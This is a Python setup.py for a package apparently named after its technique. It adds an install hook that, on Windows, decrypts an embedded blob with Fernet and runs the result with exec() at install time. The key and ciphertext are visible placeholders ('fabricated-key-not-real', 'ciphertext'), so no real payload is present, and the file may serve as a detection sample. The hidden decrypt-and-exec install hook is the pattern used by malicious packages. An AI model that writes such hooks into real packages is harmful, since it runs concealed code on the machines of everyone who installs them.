from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        import os
        if os.name == 'nt':
            from fernet import Fernet
            exec(Fernet(b'ZmFicmljYXRlZC1rZXktbm90LXJlYWw=').decrypt(b'ciphertext'))


setup(name='install-command-decrypt-exec', version='1.0',
      cmdclass={'install': PostInstall})
